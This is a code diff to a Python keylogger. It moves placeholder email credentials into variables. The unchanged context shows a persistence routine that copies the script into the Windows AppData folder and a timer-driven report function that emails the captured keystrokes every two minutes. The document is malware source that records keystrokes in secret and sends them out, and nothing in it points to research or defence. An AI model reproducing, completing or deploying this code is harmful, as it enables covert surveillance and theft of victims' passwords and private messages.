@@ -8,6 +8,8 @@ import subprocess
 import time
 
 store_keys='key_logger_start'
+email="#give you mail id"
+password="#enter you password of Given previous mail id"
 def presistencs():
     file_location=os.environ['appdata'] + "\\data.py"
     if not os.path.exists(file_location):
@@ -40,7 +42,7 @@ def send_mail(email, password, message):
 
 def report():
     global store_keys
-    send_mail("#enter your emai address", "#enter your password", "\n\n" + store_keys)
+    send_mail(email,password, "\n\n" + store_keys)
     # print(store_keys)
     store_keys = ''
     timer = threading.Timer(120,report)
